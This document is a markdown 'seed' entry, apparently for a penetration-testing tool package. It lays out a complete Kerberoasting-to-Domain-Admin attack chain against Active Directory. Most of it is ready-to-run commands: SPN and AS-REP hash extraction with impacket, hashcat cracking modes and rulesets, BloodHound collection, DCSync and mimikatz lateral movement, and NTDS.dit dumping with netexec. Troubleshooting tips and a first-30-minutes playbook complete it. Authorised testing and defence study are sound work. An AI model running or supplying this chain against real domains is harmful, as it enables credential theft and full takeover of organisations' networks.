# [Seed] Kerberoasting → offline cracking → DA

## Scenario category
Penetration testing / AD attack

## Goal summary
With standard domain-user credentials and an SPN-configured service account in the target domain, use Kerberoasting to obtain a TGS for offline cracking. Recover the plaintext password and use BloodHound to find a path directly to DA.

## Full execution path

1. Establish an internal foothold with any standard user. Local administrator rights are not needed.
2. Enumerate SPNs.
   ```bash
   GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 -request -outputfile tgs.hash
   ```
3. Identify accounts with SPNs, usually SQL Server, IIS, or custom service accounts.
4. Crack the hash offline.
   ```bash
   hashcat -m 13100 tgs.hash /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
   ```
5. Recover an svc account password → use BloodHound to find paths available to the account.
6. If the account belongs to a Tier 0 group (Domain Admins / Server Operators / Backup Operators) → run DCSync directly.
7. If it does not, but it can RDP or WinRM to a key host → use mimikatz there and move laterally to DA.

## Pitfall log

| Problem | Cause | Solution | Time |
|------|------|---------|------|
| GetUserSPNs returned nothing | The current user lacked permission to read SPNs | Any standard domain user can read them. Check for a wrong `-dc-ip` or unavailable PreAuth | 20min |
| Cracking ran for hours without success | The password was strong | 1) Change dictionaries (rockyou.txt + corporate keywords) 2) Use a GPU (hashcat -d 1) 3) Try the OneRuleToRuleThemAll ruleset | Several hours |
| Login failed after obtaining the password | The credential expired or was case-sensitive | Verify with nxc: `nxc smb dc.local -u svc -p 'Pass'` | 10min |
| BloodHound had no data | Collection omitted GPO/ACL data | `bloodhound-python -c All` must include All. The newer BHCE supports `--zip` | 30min |
| AS-REP Roasting found no target | Few accounts had "Do not require Kerberos preauth" set | Run `GetNPUsers.py` separately: ` -usersfile users.txt -no-pass` | 15min |

## Toolchain findings

- **impacket-GetUserSPNs** is a common choice and works across platforms, unlike PowerView.
- **netexec (nxc)** replaces CrackMapExec. It is fast and includes spider_plus, lsassy, and ntds modules.
- **BloodHound Community Edition (BHCE)** is the current release and is faster than the older BloodHound.
- **OneRuleToRuleThemAll** is an effective ruleset for password cracking.
- **bloodyAD** is a newer AD tool focused on low-privilege ACL exploitation and privilege escalation.

## Key code / commands

Complete Kerberoasting flow:

```bash
# 1. Verify credentials
nxc smb 10.0.0.1 -u user -p 'Pass123' -d domain.local

# 2. Extract the TGS
GetUserSPNs.py domain.local/user:Pass123 -dc-ip 10.0.0.1 \
  -request -outputfile tgs.hash

# 3. Also run AS-REP Roasting
GetNPUsers.py domain.local/ -dc-ip 10.0.0.1 \
  -usersfile users.txt -no-pass -format hashcat \
  -outputfile asrep.hash

# 4. Crack offline
hashcat -m 13100 tgs.hash rockyou.txt -r OneRuleToRuleThemAll.rule  # TGS-Rep
hashcat -m 18200 asrep.hash rockyou.txt                              # AS-Rep

# 5. Collect BloodHound data after obtaining the password
bloodhound-python -u user -p 'Pass123' -d domain.local -ns 10.0.0.1 -c All --zip

# 6. Find the path: mark the svc account as Owned and select Shortest Path to DA
```

If the svc account can access SeBackupPrivilege on the DC:

```bash
nxc smb dc.domain.local -u svc -p 'CrackedPass' --ntds
# Dump NTDS.dit directly
```

## Improvement suggestions for this package

- Add a full Kerberoasting section to `pentest-tools/references/network-attack-defense.md`.
- BloodHound CE is now the main release. The bootstrap manifest should explicitly install `bloodhound-ce-cli`.
- Add `pentest-tools/references/ad-cheatsheet.md` with the six major AD attacks (Kerberoasting / AS-REP / DCSync / DCShadow / Constrained Delegation / Resource-Based Constrained Delegation / ESC1-ESC15) on one page.

## Reusable patterns / script fragments

**Standard first 30 minutes after an internal foothold**:

```text
1. Verify credentials with nxc smb and spider shares automatically
2. Run GetUserSPNs and GetNPUsers
3. Collect data with bloodhound-python -c All
4. Crack hashes offline in parallel on a GPU
5. Review BloodHound for Tier 0 / pre-built attack paths while cracking runs
6. Recover the password → mark Owned → check paths again
```

**AD Kerberos hashcat mode quick reference**:

| Mode | Use |
|------|------|
| 13100 | Kerberos TGS-Rep (Kerberoasting) |
| 18200 | Kerberos AS-Rep (AS-REP Roasting) |
| 5500  | NetNTLMv1 |
| 5600  | NetNTLMv2 (captured by Responder) |
| 19600 | Kerberos TGS-Rep (AES128) |
| 19700 | Kerberos TGS-Rep (AES256) |

## Evolution actions
- [ ] Add ad-cheatsheet.md
- [ ] Check nxc / bloodhound-ce / bloodyAD status in tool-index
- [x] The routing matrix includes Kerberos / Kerberoasting

## Environment information
- Kali 2026.x, impacket 0.12+, netexec 1.x, hashcat 6.2+
- Target AD: Windows Server 2019/2022, domain functional level 2016+
- Attack position: any internal foothold with a standard domain user

## Redaction requirements
This seed entry is based on public AD attack techniques and does not involve a real target domain.
